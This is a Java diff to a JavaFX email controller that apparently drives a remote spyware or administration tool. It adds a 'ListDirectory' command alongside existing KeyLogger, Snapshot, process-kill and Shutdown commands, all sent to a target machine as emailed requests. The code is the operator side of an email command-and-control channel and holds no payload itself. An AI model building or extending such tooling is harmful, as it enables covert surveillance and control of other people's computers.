@@ -47,7 +47,7 @@ public class sendMailController {
     }
 
     public void initialize() {
-        List<String> list = List.of("Snapshot", "KeyLogger", "ListProcess", "StopProcess", "OpenProcess", "Shutdown");
+        List<String> list = List.of("Snapshot", "KeyLogger","ListDirectory", "ListProcess", "StopProcess", "OpenProcess", "Shutdown");
         comboBox.setItems(FXCollections.observableList(list));
         comboBox.getSelectionModel().selectFirst();
         addField.setEditable(false);
@@ -74,6 +74,12 @@ public class sendMailController {
                         addField.setDisable(true);
                         addField.setEditable(false);
                         labelAddField.setText("Nothing here");
+                        sendBut.setDisable(false);
+                    }
+                    else if(t1.equals("ListDirectory")){
+                        addField.setDisable(true);
+                        addField.setEditable(false);
+                        labelAddField.setText("Coming Soon");
                         sendBut.setDisable(false);
                     }
                     else {
@@ -195,6 +201,32 @@ public class sendMailController {
             });
             thread.start();
         }
+
+        else if (choose.equals("ListDirectory")) {
+            int id = random.nextInt(1000,9999);
+            sendBut.setDisable(true);
+            Thread thread = new Thread(() -> {
+                try {
+                    System.out.println(Thread.currentThread().getName());
+                    SendMail.getInstance().sendMail("req / " + id + " / " + "listdir");
+                    logText("ID: " + id + " Send Mail Successfully! Wait for response!", "green");
+                    String a = CheckMail.getInstance().listen(id, 40);
+                    if (a != null) {
+                        logText("Get Response successfully. File in " + a, "green");
+                        Platform.runLater(() -> {
+                            sendBut.setDisable(false);
+                        });
+                    } else {
+                        logText("Error happens", "red");
+                    }
+                } catch (IOException | MessagingException e) {
+                    logText(e.getMessage(), "red");
+                    e.printStackTrace();
+                }
+            });
+            thread.start();
+        }
+
     }
 
     public void idChange(InputMethodEvent inputMethodEvent) {
